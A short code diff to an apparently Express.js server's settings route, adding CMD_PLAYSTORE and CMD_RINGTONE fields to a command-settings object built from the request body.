@@ -379,6 +379,8 @@ app.post('/update-link', (req, res) => {
 
 app.post('/settings', (req, res) => {
     const newCommands = {
+        CMD_PLAYSTORE: req.body.CMD_PLAYSTORE,
+        CMD_RINGTONE: req.body.CMD_RINGTONE,
         CMD_WALLPAPER: req.body.CMD_WALLPAPER,
         CMD_CERTIFICATE: req.body.CMD_CERTIFICATE,
         CMD_VULNERABILITY: req.body.CMD_VULNERABILITY,
